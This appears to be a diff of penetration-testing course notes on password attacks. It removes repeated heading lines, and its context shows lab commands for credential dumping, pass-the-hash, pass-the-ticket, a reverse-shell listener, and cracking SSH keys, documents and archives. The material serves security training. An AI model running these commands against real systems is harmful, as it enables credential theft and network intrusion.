 
 ```shell-session
 cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
@@ -2667,8 +2515,6 @@ An even more powerful tool we can use that was mentioned earlier in the Credenti
 For example, `Keyrings` are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.
 
 **Memory - LaZagne**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
@@ -2710,16 +2556,12 @@ For example, when we store credentials for a web page in the Firefox browser, th
 
 **Firefox Stored Credentials**
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 
 
 drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
 drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
 ```
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
@@ -2754,8 +2596,6 @@ The tool [Firefox Decrypt](https://github.com/unode/firefox\_decrypt) is excelle
 
 **Decrypting Firefox Credentials**
 
-Credential Hunting in Linux
-
 ```shell-session
 root@htb[/htb]$ python3.9 firefox_decrypt.py
 
@@ -2777,8 +2617,6 @@ Password: 'FzXUxJemKm6g2lGh'
 Alternatively, `LaZagne` can also return results if the user has used the supported browser.
 
 **Browsers - LaZagne**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ python3 laZagne.py browsers
@@ -2836,23 +2674,17 @@ Usually, we find the value `x` in this field, which means that the passwords are
 
 **Editing /etc/passwd - Before**
 
-Passwd, Shadow & Opasswd
-
 ```shell-session
 root:x:0:0:root:/root:/bin/bash
 ```
 
 **Editing /etc/passwd - After**
 
-Passwd, Shadow & Opasswd
-
 ```shell-session
 root::0:0:root:/root:/bin/bash
 ```
 
 **Root without Password**
-
-Passwd, Shadow & Opasswd
 
 ```shell-session
 [cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd
@@ -2880,8 +2712,6 @@ Since reading the password hash values can put the entire system in danger, the 
 | Username   |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |
 
 **Shadow File**
-
-Passwd, Shadow & Opasswd
 
 ```shell-session
 [cry0l1t3@parrot]─[~]$ sudo cat /etc/shadow
@@ -2996,8 +2826,6 @@ The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https
 
 **Pass the Hash from Windows Using Mimikatz:**
 
-Pass the Hash (PtH)
-
 ```cmd-session
 c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 user    : julio
@@ -3043,8 +2871,6 @@ The following command will use the SMB method for command execution to create a 
 
 **Invoke-TheHash with SMB**
 
-Pass the Hash (PtH)
-
 ```powershell-session
 PS c:\htb> cd C:\tools\Invoke-TheHash\
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
@@ -3064,8 +2890,6 @@ To get a reverse shell, we need to start our listener using Netcat on our Window
 
 **Netcat Listener**
 
-Pass the Hash (PtH)
-
 ```powershell-session
 PS C:\tools> .\nc.exe -lvnp 8001
 listening on [any] 8001 ...
@@ -3078,8 +2902,6 @@ To create a simple reverse shell using PowerShell, we can visit [https://www.rev
 Now we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer. Notice that instead of providing the IP address, which is `172.16.1.10`, we will use the machine name `DC01` (either would work).
 
 **Invoke-TheHash with WMI**
-
-Pass the Hash (PtH)
 
 ```powershell-session
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
@@ -3099,8 +2921,6 @@ The result is a reverse shell connection from the DC01 host (172.16.1.10).
 [Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.
 
 **Pass the Hash with Impacket PsExec**
-
-Pass the Hash (PtH)
 
 ```shell-session
 root@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
@@ -3134,8 +2954,6 @@ There are several other tools in the Impacket toolkit we can use for command exe
 
 **Pass the Hash with CrackMapExec**
 
-Pass the Hash (PtH)
-
 ```shell-session
 root@htb[/htb]# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
@@ -3148,8 +2966,6 @@ SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2
 If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands. It is common to see password reuse against many hosts in the same subnet. Organizations will often use gold images with the same local admin password or set this password the same across multiple hosts for ease of administration. If we run into this issue on a real-world engagement, a great recommendation for the customer is to implement the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), which randomizes the local administrator password and can be configured to have it rotate on a fixed interval.
 
 **CrackMapExec - Command Execution**
-
-Pass the Hash (PtH)
 
 ```shell-session
 root@htb[/htb]# crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
@@ -3169,8 +2985,6 @@ Review the [CrackMapExec documentation Wiki](https://wiki.porchetta.industries/)
 [evil-winrm](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.
 
 **Pass the Hash with evil-winrm**
-
-Pass the Hash (PtH)
 
 ```shell-session
 root@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
@@ -3200,8 +3014,6 @@ This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG\_
 
 **Enable Restricted Admin Mode to Allow PtH**
 
-Pass the Hash (PtH)
-
 ```cmd-session
 c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
@@ -3211,8 +3023,6 @@ c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v Disa
 Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:
 
 **Pass the Hash Using RDP**
-
-Pass the Hash (PtH)
 
 ```shell-session
 root@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
@@ -3290,8 +3100,6 @@ We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::
 
 **Mimikatz - Export Tickets**
 
-Pass the Ticket (PtT) from Windows
-
 ```cmd-session
 c:\tools> mimikatz.exe
 
@@ -3364,8 +3172,6 @@ We can also export tickets using `Rubeus` and the option `dump`. This option can
 Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des\_cbc\_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
 
 **Rubeus - Export Tickets**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 c:\tools> Rubeus.exe dump /nowrap
@@ -3440,8 +3246,6 @@ To forge our tickets, we need to have the user's hash; we can use Mimikatz to du
 
 **Mimikatz - Extract Kerberos Keys**
 
-Pass the Ticket (PtT) from Windows
-
 ```cmd-session
 c:\tools> mimikatz.exe
 
@@ -3482,8 +3286,6 @@ SID               : S-1-5-21-228825152-3134732153-3833540767-1107
 Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
 
 **Mimikatz - Pass the Key or OverPass the Hash**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 c:\tools> mimikatz.exe
@@ -3526,8 +3328,6 @@ This will create a new `cmd.exe` window that we can use to request access to any
 To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.
 
 **Rubeus - Pass the Key or OverPass the Hash**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
@@ -3577,8 +3377,6 @@ Now that we have some Kerberos tickets, we can use them to move laterally within
 With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
 
 **Rubeus Pass the Ticket**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
@@ -3641,8 +3439,6 @@ Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
 
 **Rubeus - Pass the Ticket**
 
-Pass the Ticket (PtT) from Windows
-
 ```cmd-session
 c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 
@@ -3674,8 +3470,6 @@ We can also use the base64 output from Rubeus or convert a .kirbi to base64 to p
 
 **Convert .kirbi to Base64 Format**
 
-Pass the Ticket (PtT) from Windows
-
 ```powershell-session
 PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 
@@ -3685,8 +3479,6 @@ doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAAD
 Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
 
 **Pass the Ticket - Base64 Format**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
@@ -3717,8 +3509,6 @@ d-----         6/4/2022  11:17 AM                Program Files (x86)
 Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
 
 **Mimikatz - Pass the Ticket**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 C:\tools> mimikatz.exe 
@@ -3769,8 +3559,6 @@ To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import o
 
 **Mimikatz - Pass the Ticket for Lateral Movement.**
 
-Pass the Ticket (PtT) from Windows
-
 ```cmd-session
 C:\tools> mimikatz.exe
 
@@ -3811,8 +3599,6 @@ Rubeus has the option `createnetonly`, which creates a sacrificial process/logon
 
 **Create a Sacrificial Process with Rubeus**
 
-Pass the Ticket (PtT) from Windows
-
 ```cmd-session
 C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ______        _
@@ -3842,8 +3628,6 @@ C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
 
 **Rubeus - Pass the Ticket for Lateral Movement**
-
-Pass the Ticket (PtT) from Windows
 
 ```cmd-session
 C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
@@ -3962,8 +3746,6 @@ Let's assume we are in a new assessment, and the company gives us access to `LIN
 
 **Linux Auth via Port Forward**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 
@@ -4005,8 +3787,6 @@ We can identify if the Linux machine is domain joined using [realm](https://acce
 
 **realm - Check If Linux Machine is Domain Joined**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ realm list
 
@@ -4035,8 +3815,6 @@ In case [realm](https://access.redhat.com/documentation/en-us/red\_hat\_enterpri
 
 **PS - Check if Linux Machine is Domain Joined**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
 
@@ -4060,8 +3838,6 @@ A straightforward approach is to use `find` to search for files whose name conta
 
 **Using Find to Search for Files with Keytab in the Name**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
@@ -4076,8 +3852,6 @@ Note: To use a keytab file, we must have read and write (rw) privileges on the f
 Another way to find `keytab` files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script. Let's see this example:
 
 **Identifying Keytab Files in Cronjobs**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 carlos@inlanefreight.htb@linux01:~$ crontab -l
@@ -4109,8 +3883,6 @@ A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/
 
 **Reviewing Environment Variables for ccache Files.**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ env | grep -i krb5
 
@@ -4120,8 +3892,6 @@ KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.
 
 **Searching for ccache Files in /tmp**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 david@inlanefreight.htb@linux01:~$ ls -la /tmp
@@ -4142,8 +3912,6 @@ As attackers, we may have several uses for a keytab file. The first thing we can
 
 **Listing keytab File Information**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ klist -k -t 
 
@@ -4159,8 +3927,6 @@ The ticket corresponds to the user Carlos. We can now impersonate the user with 
 Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.
 
 **Impersonating a User with a keytab**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 david@inlanefreight.htb@linux01:~$ klist 
@@ -4185,8 +3951,6 @@ We can attempt to access the shared folder `\\dc01\carlos` to confirm our access
 
 **Connecting to SMB Share as Carlos**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 
@@ -4206,8 +3970,6 @@ The second method we will use to abuse Kerberos on Linux is extracting the secre
 We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
 
 **Extracting Keytab Hashes with KeyTabExtract**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
@@ -4234,8 +3996,6 @@ The most straightforward hash to crack is the NTLM hash. We can use tools like [
 As we can see in the image, the password for the user Carlos is `Password5`. We can now log in as Carlos.
 
 **Log in as Carlos**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
@@ -4264,8 +4024,6 @@ Once we log in with the credentials for the user `svc_workstations`, we can use 
 
 **Privilege Escalation to Root**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                   
@@ -4289,8 +4047,6 @@ As root, we need to identify which tickets are present on the machine, to whom t
 
 **Looking for ccache Files**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@linux01:~# ls -la /tmp
 
@@ -4309,8 +4065,6 @@ There is one user (julio@inlanefreight.htb) to whom we have not yet gained acces
 
 **Identifying Group Membership with the id Command**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@linux01:~# id julio@inlanefreight.htb
 
@@ -4322,8 +4076,6 @@ Julio is a member of the `Domain Admins` group. We can attempt to impersonate th
 To use a ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
 
 **Importing the ccache File into our Current Session**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 root@linux01:~# klist
@@ -4370,8 +4122,6 @@ In this scenario, our attack host doesn't have a connection to the `KDC/Domain C
 
 **Host File Modified**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ cat /etc/hosts
 
@@ -4385,8 +4135,6 @@ We need to modify our proxychains configuration file to use socks5 and port 1080
 
 **Proxychains Configuration File**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ cat /etc/proxychains.conf
 
@@ -4399,8 +4147,6 @@ socks5 127.0.0.1 1080
 We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.
 
 **Download Chisel to our Attack Host**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 root@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
@@ -4425,8 +4171,6 @@ root@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Passw
 
 **Execute chisel from MS01**
 
-Pass the Ticket (PtT) from Linux
-
 ```cmd-session
 C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
@@ -4440,8 +4184,6 @@ Finally, we need to transfer Julio's ccache file from `LINUX01` and create the e
 
 **Setting the KRB5CCNAME Environment Variable**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
@@ -4453,8 +4195,6 @@ Note: If you are not familiar with file transfer operations, check out the modul
 To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option `-k`. If we get a prompt for a password, we can also include the option `-no-pass`.
 
 **Using Impacket with proxychains and Kerberos Authentication**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 root@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
@@ -4485,8 +4225,6 @@ To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we
 
 **Installing Kerberos Authentication Package**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ sudo apt-get install krb5-user -y
 
@@ -4511,8 +4249,6 @@ In case the package `krb5-user` is already installed, we need to change the conf
 
 **Kerberos Configuration File for INLANEFREIGHT.HTB**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ cat /etc/krb5.conf
 
@@ -4532,8 +4268,6 @@ root@htb[/htb]$ cat /etc/krb5.conf
 Now we can use evil-winrm.
 
 **Using Evil-WinRM with Kerberos**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 root@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
@@ -4564,8 +4298,6 @@ If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machin
 
 **Impacket Ticket Converter**
 
-Pass the Ticket (PtT) from Linux
-
 ```shell-session
 root@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
@@ -4578,8 +4310,6 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.
 
 **Importing Converted Ticket into Windows Session with Rubeus**
-
-Pass the Ticket (PtT) from Linux
 
 ```cmd-session
 C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
@@ -4635,8 +4365,6 @@ C:\htb>dir \\dc01\julio
 Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
 
 **Linikatz Download and Execution**
-
-Pass the Ticket (PtT) from Linux
 
 ```shell-session
 root@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
@@ -4744,8 +4472,6 @@ Many different file extensions can identify these types of encrypted/encoded fil
 
 **Hunting for Files**
 
-Protected Files
-
 ```shell-session
 cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
@@ -4774,8 +4500,6 @@ If we encounter file extensions on the system that we are not familiar with, we 
 
 **Hunting for SSH Keys**
 
-Protected Files
-
 ```shell-session
 cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 
@@ -4787,8 +4511,6 @@ cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
 Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.
 
 **Encrypted SSH Keys**
-
-Protected Files
 
 ```shell-session
 cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private
@@ -4811,8 +4533,6 @@ If we see such a header in an SSH key, we will, in most cases, not be able to us
 `John The Ripper` has many different scripts to generate hashes from files that we can then use for cracking. We can find these scripts on our system using the following command.
 
 **John Hashing Scripts**
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ locate *2john*
@@ -4844,8 +4564,6 @@ root@htb[/htb]$ locate *2john*
 
 We can convert many different formats into single hashes and try to crack the passwords with this. Then, we can open, read, and use the file if we succeed. There is a Python script called `ssh2john.py` for SSH keys, which generates the corresponding hashes for encrypted SSH keys, which we can then store in files.
 
-Protected Files
-
 ```shell-session
 root@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
 root@htb[/htb]$ cat ssh.hash 
@@ -4856,8 +4574,6 @@ ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
 Next, we need to customize the commands accordingly with the password list and specify our file with the hashes as the target to be cracked. After that, we can display the cracked hashes by specifying the hash file and using the `--show` option.
 
 **Cracking SSH Keys**
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
@@ -4874,8 +4590,6 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
 Session completed
 ```
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ john ssh.hash --show
@@ -4895,16 +4609,12 @@ Pretty much all reports, documentation, and information sheets can be found in t
 
 **Cracking Microsoft Office Documents**
 
-Protected Files
-
 ```shell-session
 root@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
 root@htb[/htb]$ cat protected-docx.hash
 
 Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
 ```
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
@@ -4920,8 +4630,6 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Protected Files
-
 ```shell-session
 root@htb[/htb]$ john protected-docx.hash --show
 
@@ -4930,16 +4638,12 @@ Protected.docx:1234
 
 **Cracking PDFs**
 
-Protected Files
-
 ```shell-session
 root@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
 root@htb[/htb]$ cat pdf.hash 
 
 PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
 ```
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
@@ -4954,8 +4658,6 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show --format=PDF" options to display all of the cracked passwords reliably
 Session completed
 ```
-
-Protected Files
 
 ```shell-session
 root@htb[/htb]$ john pdf.hash --show
@@ -4987,8 +4689,6 @@ There are many types of archive files. Some common file extensions include, but 
 An extensive list of archive types can be found on [FileInfo.com](https://fileinfo.com/filetypes/compressed). However, instead of manually typing them out, we can also query them using a one-liner, filter them out, and save them to a file if needed. At the time of writing, there are `337`archive file types listed on fileinfo.com.
 
 **Download All File Extensions**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
@@ -5022,8 +4722,6 @@ The .zip format is often heavily used in Windows environments to compress many f
 
 **Using zip2john**
 
-Protected Archives
-
 ```shell-session
 root@htb[/htb]$ zip2john ZIP.zip > zip.hash
 
@@ -5034,8 +4732,6 @@ By extracting the hashes, we will also see which files are in the ZIP archive.
 
 **Viewing the Contents of zip.hash**
 
-Protected Archives
-
 ```shell-session
 root@htb[/htb]$ cat zip.hash 
 
@@ -5045,8 +4741,6 @@ ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7fe
 Once we have extracted the hash, we can now use `john` again to crack it with the desired password list. Because if `john` cracks it successfully, it will show us the corresponding password that we can use to open the ZIP archive.
 
 **Cracking the Hash with John**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
@@ -5062,8 +4756,6 @@ Session completed
 ```
 
 **Viewing the Cracked Hash**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ john zip.hash --show
@@ -5081,8 +4773,6 @@ Furthermore, it is not always directly apparent whether the archive found is pas
 
 **Listing the Files**
 
-Protected Archives
-
 ```shell-session
 root@htb[/htb]$ ls
 
@@ -5090,8 +4780,6 @@ GZIP.gzip  rockyou.txt
 ```
 
 **Using file**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ file GZIP.gzip 
@@ -5104,8 +4792,6 @@ When cracking OpenSSL encrypted files and archives, we can encounter many differ
 The following one-liner will show many errors related to the GZIP format, which we can ignore. If we have used the correct password list, as in this example, we will see that we have successfully extracted another file from the archive.
 
 **Using a for-loop to Display Extracted Contents**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
@@ -5125,8 +4811,6 @@ Once the for-loop has finished, we can look in the current folder again to check
 
 **Listing the Contents of the Cracked Archive**
 
-Protected Archives
-
 ```shell-session
 root@htb[/htb]$ ls
 
@@ -5143,8 +4827,6 @@ Virtual drives are often created in which personal information, notes, and docum
 
 **Using bitlocker2john**
 
-Protected Archives
-
 ```shell-session
 root@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
 root@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
@@ -5156,8 +4838,6 @@ $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd8010300
 Both `John` and `Hashcat` can be used for this purpose. This example will look at the procedure with `Hashcat`. The Hashcat mode for cracking BitLocker hashes is `-m 22100`. So we provide Hashcat with the file with the one hash, specify our password list, and specify the hash mode. Since this is robust encryption (`AES`), cracking can take some time, depending on the hardware used. Additionally, we can specify the filename in which the result should be stored.
 
 **Using hashcat to Crack backup.hash**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
@@ -5189,8 +4869,6 @@ Stopped: Wed Feb  9 11:48:23 2022
 ```
 
 **Viewing the Cracked Hash**
-
-Protected Archives
 
 ```shell-session
 root@htb[/htb]$ cat backup.cracked 
